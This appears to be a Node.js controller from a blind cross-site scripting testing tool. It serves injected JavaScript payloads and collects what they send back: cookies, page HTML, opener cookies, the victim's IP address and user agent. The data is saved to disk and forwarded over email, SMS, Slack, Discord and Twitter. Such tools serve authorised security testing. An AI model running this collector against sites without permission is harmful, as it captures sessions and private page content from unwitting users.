// Copyright 2018 Lewis Ardern. All rights reserved.

const mail = require('../utilities/services/email');
const sms = require('../utilities/services/sms');
const process = require('../utilities/process');
const save = require('../utilities/save');
const uuid = require('uuid/v1');
const config = require('../config/config');
const slack = require('../utilities/services/slack');
const discord = require('../utilities/services/discord');
const ciscoTeams = require('../utilities/services/spark');
const twitter = require('../utilities/services/twitter');
const template = require('../utilities/templates/script');
const payloads = require('../utilities/payloads');

/* eslint-disable no-shadow */
function reportToUtilities(guid, domain, config) {
  mail.sendMail(guid, domain, config);
  slack.sendSlack(guid, domain, config);
  ciscoTeams.sendCiso(guid, domain, config);
  discord.sendDiscord(guid, domain, config);
  twitter.sendTwitter(guid, domain, config);
}

function sendSmsAndSaveToDisk(domain, res, guid) {
  if (!sms.lastSms()) {
    console.log(`Sending SMS And Saving To Disk For URL ${domain.URL}`);
    sms.sendSMS(guid, domain, config, save);
    save.saveFile(guid, domain, config);
    res.redirect(domain.URL);
  } else {
    res.redirect(domain.URL);
    console.log(`Already Sent SMS Today, Saving To Disk For URL ${domain.URL}`);
    save.saveFile(guid, domain, config);
  }
}
/* eslint-enable no-shadow */

exports.displayScript = (req, res) => {
  res.type('.js');
  const generatedTemplate = template.generateTemplate(config);
  res.send(generatedTemplate);
};

exports.displayDefault = (req, res) => {
  res.type('.js');
  res.send('alert(1)');
};

exports.generatePayloads = (req, res) => {
  res.set('Content-Type', 'text/plain');
  const generatedPayloads = payloads.generatePayloads(config);
  res.send(generatedPayloads);
};

exports.capture = (req, res) => {
  let domain = {};
  const guid = uuid();
  if (req.body._) {
    domain = process.processDomain(req.body._, config);
  }
  if (req.originalUrl === '/mH') {
    domain = {
      Cookie: 'null',
      innerHTML: 'null',
      URL: req.get('referer'),
      openerLocation: 'null',
      openerInnerHTML: 'null',
      openerCookie: 'null',
      hasSecurityTxt: 'null'
    };
  }
  domain.victimIP =
    req.headers['x-forwarded-for'] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    req.connection.socket.remoteAddress;
  domain.userAgent = req.headers['user-agent'];

  // check if domain.URL exists or is not null/empty (should always be captured if valid request)
  sendSmsAndSaveToDisk(domain, res, guid);

  // Always send to email, slack, webex teams, or discord
  reportToUtilities(guid, domain, config);
};
